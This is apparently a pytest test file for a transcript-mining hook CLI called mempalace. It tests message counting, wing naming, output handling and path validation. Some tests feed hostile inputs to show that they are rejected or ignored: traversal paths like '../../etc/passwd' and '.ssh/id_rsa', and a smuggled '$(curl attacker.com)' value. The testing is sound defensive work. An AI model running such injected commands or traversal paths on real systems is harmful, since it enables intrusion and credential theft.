import contextlib
import io
import json
import os
import subprocess
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from mempalace.hooks_cli import (
    SAVE_INTERVAL,
    _count_human_messages,
    _log,
    _mempalace_python,
    _parse_harness_input,
    _sanitize_session_id,
    _validate_transcript_path,
    _wing_from_transcript_path,
    hook_stop,
    hook_session_start,
    hook_precompact,
    run_hook,
)


def _capture_hook_output(hook_fn, data, harness="claude-code", state_dir=None):
    """Run a hook and capture its JSON stdout output."""
    import io
    from unittest.mock import PropertyMock

    buf = io.StringIO()
    patches = [patch("mempalace.hooks_cli._output", side_effect=lambda d: buf.write(json.dumps(d)))]
    if state_dir:
        patches.append(patch("mempalace.hooks_cli.STATE_DIR", state_dir))
    # Mock MempalaceConfig so tests don't depend on user's ~/.mempalace/config.json
    mock_config = MagicMock()
    type(mock_config).hook_silent_save = PropertyMock(return_value=True)
    type(mock_config).hook_desktop_toast = PropertyMock(return_value=False)
    patches.append(patch("mempalace.config.MempalaceConfig", return_value=mock_config))
    with contextlib.ExitStack() as stack:
        for p in patches:
            stack.enter_context(p)
        hook_fn(data, harness)
    return json.loads(buf.getvalue())


def test_stop_hook_spawns_cursor_mine_at_threshold(tmp_path):
    """At SAVE_INTERVAL real user messages, Stop spawns the cursor mine
    (the sole chromadb writer on this path — it serializes against other
    processes via palace_write_lock inside the collection wrapper).
    """
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
    )
    with patch("mempalace.hooks_cli._ingest_transcript") as mock_ingest:
        result = _capture_hook_output(
            hook_stop,
            {"session_id": "test", "stop_hook_active": False, "transcript_path": str(transcript)},
            state_dir=tmp_path,
        )
    assert result == {}
    mock_ingest.assert_called_once_with(str(transcript))


def test_precompact_mines_transcript_dir(tmp_path, monkeypatch):
    """Precompact ingests the active transcript via _ingest_transcript —
    the only mining that fires, spawned via Popen (background).
    """
    from mempalace.hooks_cli import PRECOMPACT_CUSTOM_INSTRUCTIONS

    transcript = tmp_path / "t.jsonl"
    # _ingest_transcript skips files smaller than 100 bytes, so pad it.
    transcript.write_text("x" * 200)
    monkeypatch.delenv("MEMPAL_DIR", raising=False)
    with patch("mempalace.hooks_cli.subprocess.Popen") as mock_popen:
        with patch("mempalace.hooks_cli.subprocess.run") as mock_run:
            result = _capture_hook_output(
                hook_precompact,
                {"session_id": "test", "transcript_path": str(transcript)},
                state_dir=tmp_path,
            )
    assert result == {"newCustomInstructions": PRECOMPACT_CUSTOM_INSTRUCTIONS}
    mock_run.assert_not_called()
    mock_popen.assert_called_once()
    cmd = mock_popen.call_args[0][0]
    # Mines the transcript's parent dir as convos with the canonical
    # wing derived from the dir name (no hardcoded --wing).
    assert str(tmp_path) in cmd
    assert cmd[cmd.index("--mode") + 1] == "convos"
    assert "--wing" not in cmd


# --- _mempalace_python ---


def test_mempalace_python_returns_string():
    result = _mempalace_python()
    assert isinstance(result, str)
    assert "python" in result


def test_mempalace_python_finds_venv():
    """Should resolve to a valid Python interpreter path."""
    result = _mempalace_python()
    assert result and "python" in os.path.basename(result).lower()


# --- _sanitize_session_id ---


def test_sanitize_normal_id():
    assert _sanitize_session_id("abc-123_XYZ") == "abc-123_XYZ"


def test_sanitize_strips_dangerous_chars():
    assert _sanitize_session_id("../../etc/passwd") == "etcpasswd"


def test_sanitize_empty_returns_unknown():
    assert _sanitize_session_id("") == "unknown"
    assert _sanitize_session_id("!!!") == "unknown"


# --- _count_human_messages ---


def _write_transcript(path: Path, entries: list[dict]):
    with open(path, "w", encoding="utf-8") as f:
        for entry in entries:
            f.write(json.dumps(entry) + "\n")


def test_count_human_messages_basic(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [
            {"message": {"role": "user", "content": "hello"}},
            {"message": {"role": "assistant", "content": "hi"}},
            {"message": {"role": "user", "content": "bye"}},
        ],
    )
    assert _count_human_messages(str(transcript)) == 2


def test_count_skips_command_messages(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [
            {"message": {"role": "user", "content": "<command-message>status</command-message>"}},
            {"message": {"role": "user", "content": "real question"}},
        ],
    )
    assert _count_human_messages(str(transcript)) == 1


def test_count_handles_list_content(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [
            {"message": {"role": "user", "content": [{"type": "text", "text": "hello"}]}},
            {
                "message": {
                    "role": "user",
                    "content": [{"type": "text", "text": "<command-message>x</command-message>"}],
                }
            },
        ],
    )
    assert _count_human_messages(str(transcript)) == 1


def test_count_missing_file():
    assert _count_human_messages("/nonexistent/path.jsonl") == 0


def test_count_empty_file(tmp_path):
    transcript = tmp_path / "t.jsonl"
    transcript.write_text("")
    assert _count_human_messages(str(transcript)) == 0


def test_count_malformed_json_lines(tmp_path):
    transcript = tmp_path / "t.jsonl"
    transcript.write_text('not json\n{"message": {"role": "user", "content": "ok"}}\n')
    assert _count_human_messages(str(transcript)) == 1


def test_stop_hook_passthrough_when_active(tmp_path):
    with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
        result = _capture_hook_output(
            hook_stop,
            {"session_id": "test", "stop_hook_active": True, "transcript_path": ""},
            state_dir=tmp_path,
        )
    assert result == {}


def test_stop_hook_passthrough_when_active_string(tmp_path):
    with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
        result = _capture_hook_output(
            hook_stop,
            {"session_id": "test", "stop_hook_active": "true", "transcript_path": ""},
            state_dir=tmp_path,
        )
    assert result == {}


def test_stop_hook_no_transcript_no_mine(tmp_path):
    """Empty transcript_path skips the cursor mine entirely."""
    with patch("mempalace.hooks_cli._ingest_transcript") as mock_ingest:
        result = _capture_hook_output(
            hook_stop,
            {"session_id": "test", "stop_hook_active": False, "transcript_path": ""},
            state_dir=tmp_path,
        )
    assert result == {}
    mock_ingest.assert_not_called()


def test_stop_hook_below_threshold_no_mine(tmp_path):
    """Stop fires every assistant stop, but only mines every SAVE_INTERVAL
    real user messages.
    """
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(3)],
    )
    with patch("mempalace.hooks_cli._ingest_transcript") as mock_ingest:
        result = _capture_hook_output(
            hook_stop,
            {"session_id": "test", "stop_hook_active": False, "transcript_path": str(transcript)},
            state_dir=tmp_path,
        )
    assert result == {}
    mock_ingest.assert_not_called()


def test_stop_hook_mines_once_per_interval(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
    )
    with patch("mempalace.hooks_cli._ingest_transcript") as mock_ingest:
        _capture_hook_output(
            hook_stop,
            {"session_id": "test", "transcript_path": str(transcript)},
            state_dir=tmp_path,
        )
        _capture_hook_output(
            hook_stop,
            {"session_id": "test", "transcript_path": str(transcript)},
            state_dir=tmp_path,
        )
    mock_ingest.assert_called_once_with(str(transcript))


# --- hook_session_start ---


def test_session_start_passes_through(tmp_path):
    result = _capture_hook_output(
        hook_session_start,
        {"session_id": "test"},
        state_dir=tmp_path,
    )
    assert result == {}


# --- hook_precompact ---


def test_precompact_allows(tmp_path):
    result = _capture_hook_output(
        hook_precompact,
        {"session_id": "test"},
        state_dir=tmp_path,
    )
    # Precompact now (commit 96b1878) always emits a customInstructions
    # payload that overrides Claude Code's default summary with a request
    # for 3-5 mempalace_search recovery queries — verbatim is already in
    # the palace, so the prose summary would be redundant.
    from mempalace.hooks_cli import PRECOMPACT_CUSTOM_INSTRUCTIONS

    assert result == {"newCustomInstructions": PRECOMPACT_CUSTOM_INSTRUCTIONS}


# --- _wing_from_transcript_path ---


# `_wing_from_transcript_path` derives the wing as
# `normalize_wing_name(Path(transcript).parent.name)` — the same canonical
# convention `mine_convos` uses on the same parent dir (commit 671a976,
# eec06f8). The test cases below pin that contract: every wing on disk
# ultimately comes from `normalize_wing_name`, never an invented `wing_*`
# namespace, so hook ingest, CLI mining, and synthetic stubs all route to
# the same wing for a given project.


def test_wing_from_transcript_path_extracts_project():
    path = "/home/jp/.claude/projects/-home-jp-Projects-memorypalace/session.jsonl"
    assert _wing_from_transcript_path(path) == "_home_jp_projects_memorypalace"


def test_wing_from_transcript_path_fallback():
    # Empty path is the only true fallback — everything else gets the
    # normalized parent name. `_sessions` (canonical-prefixed) is the
    # required fallback name; never `wing_sessions`.
    assert _wing_from_transcript_path("") == "_sessions"


def test_wing_from_transcript_path_windows_backslashes():
    # POSIX `pathlib.Path` does not split Windows backslashes — the entire
    # string is treated as a single basename, so parent.name is empty and
    # we fall through to the `_sessions` sentinel. On a Windows host
    # `WindowsPath` would split backslashes correctly. This test pins the
    # POSIX-host behavior so a future refactor that "fixes" it inadvertently
    # by string-splitting on `\\` doesn't reintroduce a parallel namespace.
    path = "C:\\Users\\jp\\.claude\\projects\\-home-jp-Projects-myapp\\session.jsonl"
    expected = "_home_jp_projects_myapp" if os.name == "nt" else "_sessions"
    assert _wing_from_transcript_path(path) == expected


def test_wing_from_transcript_path_lowercases():
    path = "/home/jp/.claude/projects/-home-jp-Projects-MyProject/session.jsonl"
    assert _wing_from_transcript_path(path) == "_home_jp_projects_myproject"


def test_wing_from_transcript_path_non_projects_layout():
    # Linux user with code under ~/dev/. The wing is the normalized form
    # of the WHOLE encoded parent folder, not a leaf-token extract — so
    # mining `~/dev/MemPalace/mempalace/` via the CLI produces the same
    # wing the hook does on transcripts from that project.
    path = "/home/igor/.claude/projects/-home-igor-dev-MemPalace-mempalace/session.jsonl"
    assert _wing_from_transcript_path(path) == "_home_igor_dev_mempalace_mempalace"


def test_wing_from_transcript_path_macos_users_layout():
    # macOS ~/ layout without a Projects/ segment.
    path = "/Users/alice/.claude/projects/-Users-alice-code-MyApp/session.jsonl"
    assert _wing_from_transcript_path(path) == "_users_alice_code_myapp"


def test_wing_from_transcript_path_nested_deep():
    path = "/home/bob/.claude/projects/-home-bob-work-clients-acme-frontend/session.jsonl"
    assert _wing_from_transcript_path(path) == "_home_bob_work_clients_acme_frontend"


# --- _log ---


def test_output_writes_to_real_stdout_fd_when_mcp_server_loaded():
    """_output() must reach fd 1 even when mcp_server has redirected sys.stdout."""
    import types

    fake_module = types.ModuleType("mempalace.mcp_server")

    read_fd, write_fd = os.pipe()
    try:
        fake_module._REAL_STDOUT_FD = write_fd
        with patch.dict("sys.modules", {"mempalace.mcp_server": fake_module}):
            from mempalace.hooks_cli import _output

            _output({"systemMessage": "test"})

        os.close(write_fd)
        written = b""
        while True:
            chunk = os.read(read_fd, 4096)
            if not chunk:
                break
            written += chunk
    finally:
        os.close(read_fd)

    data = json.loads(written.decode())
    assert data["systemMessage"] == "test"


def test_output_falls_back_to_fd1_when_mcp_server_absent():
    """_output() writes to fd 1 directly when mcp_server is not loaded."""
    read_fd, write_fd = os.pipe()
    try:
        orig_fd1 = os.dup(1)
        os.dup2(write_fd, 1)
        os.close(write_fd)
        try:
            modules_without_mcp = {
                k: v for k, v in __import__("sys").modules.items() if "mcp_server" not in k
            }
            with patch.dict("sys.modules", modules_without_mcp, clear=True):
                from mempalace.hooks_cli import _output

                _output({"continue": True})
        finally:
            os.dup2(orig_fd1, 1)
            os.close(orig_fd1)
    except Exception:
        os.close(read_fd)
        raise

    written = b""
    while True:
        chunk = os.read(read_fd, 4096)
        if not chunk:
            break
        written += chunk
    os.close(read_fd)

    data = json.loads(written.decode())
    assert data["continue"] is True


def test_log_writes_to_hook_log(tmp_path):
    with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
        _log("test message")
    log_path = tmp_path / "hook.log"
    assert log_path.is_file()
    content = log_path.read_text()
    assert "test message" in content


def test_log_oserror_is_silenced(tmp_path):
    """_log should not raise if the directory cannot be created."""
    with patch("mempalace.hooks_cli.STATE_DIR", Path("/nonexistent/deeply/nested/dir")):
        # Should not raise
        _log("this will fail silently")


def test_validate_transcript_path_traversal_rejected_jsonl(tmp_path):
    """Path traversal is rejected even when the path has a .jsonl suffix.

    The pre-fix test used "../../etc/passwd" which lacks an extension and
    so was rejected by the suffix gate before the traversal check ever
    fired (Copilot review on #1231). Use a .jsonl path with `..`
    segments to exercise the traversal guard specifically.
    """
    assert _validate_transcript_path("../t.jsonl") is None
    assert _validate_transcript_path("a/../b.jsonl") is None
    assert _validate_transcript_path("/tmp/../etc/t.jsonl") is None


# --- _parse_harness_input ---


def test_parse_harness_input_unknown():
    """Unknown harness should sys.exit(1)."""
    with pytest.raises(SystemExit) as exc_info:
        _parse_harness_input({"session_id": "test"}, "unknown-harness")
    assert exc_info.value.code == 1


def test_parse_harness_input_valid():
    result = _parse_harness_input(
        {"session_id": "abc-123", "stop_hook_active": True, "transcript_path": "/tmp/t.jsonl"},
        "claude-code",
    )
    assert result["session_id"] == "abc-123"
    assert result["stop_hook_active"] is True


# --- hook_stop with OSError on write ---


# --- hook_precompact with MEMPAL_DIR ---


def test_precompact_with_timeout(tmp_path):
    """Precompact handles TimeoutExpired gracefully — still emits the
    customInstructions override (same rationale as the OSError case)."""
    from mempalace.hooks_cli import PRECOMPACT_CUSTOM_INSTRUCTIONS

    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        with patch(
            "mempalace.hooks_cli.subprocess.run",
            side_effect=subprocess.TimeoutExpired(cmd="mine", timeout=60),
        ):
            result = _capture_hook_output(
                hook_precompact, {"session_id": "test"}, state_dir=tmp_path
            )
    assert result == {"newCustomInstructions": PRECOMPACT_CUSTOM_INSTRUCTIONS}


# --- run_hook ---


def test_run_hook_dispatches_session_start(tmp_path):
    """run_hook reads stdin JSON and dispatches to correct handler."""
    stdin_data = json.dumps({"session_id": "run-test"})
    with patch("sys.stdin", io.StringIO(stdin_data)):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._output") as mock_output:
                run_hook("session-start", "claude-code")
    mock_output.assert_called_once_with({})


def test_run_hook_dispatches_stop(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript, [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(3)]
    )
    stdin_data = json.dumps(
        {
            "session_id": "run-test",
            "stop_hook_active": False,
            "transcript_path": str(transcript),
        }
    )
    with patch("sys.stdin", io.StringIO(stdin_data)):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._output") as mock_output:
                run_hook("stop", "claude-code")
    mock_output.assert_called_once_with({})


def test_run_hook_dispatches_precompact(tmp_path):
    from mempalace.hooks_cli import PRECOMPACT_CUSTOM_INSTRUCTIONS

    stdin_data = json.dumps({"session_id": "run-test"})
    with patch("sys.stdin", io.StringIO(stdin_data)):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._output") as mock_output:
                run_hook("precompact", "claude-code")
    mock_output.assert_called_once_with({"newCustomInstructions": PRECOMPACT_CUSTOM_INSTRUCTIONS})


def test_run_hook_unknown_hook():
    stdin_data = json.dumps({"session_id": "test"})
    with patch("sys.stdin", io.StringIO(stdin_data)):
        with pytest.raises(SystemExit) as exc_info:
            run_hook("nonexistent", "claude-code")
        assert exc_info.value.code == 1


def test_run_hook_invalid_json(tmp_path):
    """Invalid stdin JSON should not crash — falls back to empty dict."""
    with patch("sys.stdin", io.StringIO("not valid json")):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._output") as mock_output:
                run_hook("session-start", "claude-code")
    mock_output.assert_called_once_with({})


# --- Security: transcript_path validation ---


def test_validate_transcript_rejects_path_traversal():
    """Paths with '..' components should be rejected."""
    assert _validate_transcript_path("../../etc/passwd") is None
    assert _validate_transcript_path("../../../.ssh/id_rsa") is None


def test_validate_transcript_rejects_wrong_extension():
    """Only .jsonl and .json extensions are accepted."""
    assert _validate_transcript_path("/tmp/transcript.txt") is None
    assert _validate_transcript_path("/tmp/secret.py") is None
    assert _validate_transcript_path("/home/user/.ssh/id_rsa") is None


def test_validate_transcript_accepts_valid_paths(tmp_path):
    """Valid .jsonl and .json paths should be accepted."""
    jsonl_path = tmp_path / "session.jsonl"
    jsonl_path.touch()
    result = _validate_transcript_path(str(jsonl_path))
    assert result is not None
    assert result.suffix == ".jsonl"

    json_path = tmp_path / "session.json"
    json_path.touch()
    result = _validate_transcript_path(str(json_path))
    assert result is not None
    assert result.suffix == ".json"


def test_validate_transcript_empty_string():
    """Empty transcript path should return None."""
    assert _validate_transcript_path("") is None


def test_count_rejects_traversal_path():
    """_count_human_messages should return 0 for path traversal attempts."""
    assert _count_human_messages("../../etc/passwd") == 0


def test_count_logs_warning_on_rejected_path(tmp_path):
    """_count_human_messages should log a warning when a non-empty path is rejected."""
    with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
        with patch("mempalace.hooks_cli._log") as mock_log:
            _count_human_messages("../../etc/passwd")
    mock_log.assert_called_once()
    assert "rejected" in mock_log.call_args[0][0].lower()


def test_validate_transcript_accepts_platform_native_path(tmp_path):
    """Validator accepts platform-native paths (backslashes on Windows, slashes on Unix)."""
    session_file = tmp_path / "projects" / "abc123" / "session.jsonl"
    session_file.parent.mkdir(parents=True)
    session_file.touch()
    # Use the OS-native string representation (backslashes on Windows)
    result = _validate_transcript_path(str(session_file))
    assert result is not None
    assert result.suffix == ".jsonl"
    assert result.is_file()


def test_stop_hook_ignores_stop_hook_active(tmp_path):
    """stop_hook_active is ignored for control flow, so a malicious string
    cannot suppress a thresholded mine.
    """
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
    )
    with patch("mempalace.hooks_cli._ingest_transcript") as mock_ingest:
        _capture_hook_output(
            hook_stop,
            {
                "session_id": "test",
                "stop_hook_active": "$(curl attacker.com)",
                "transcript_path": str(transcript),
            },
            state_dir=tmp_path,
        )
    mock_ingest.assert_called_once_with(str(transcript))
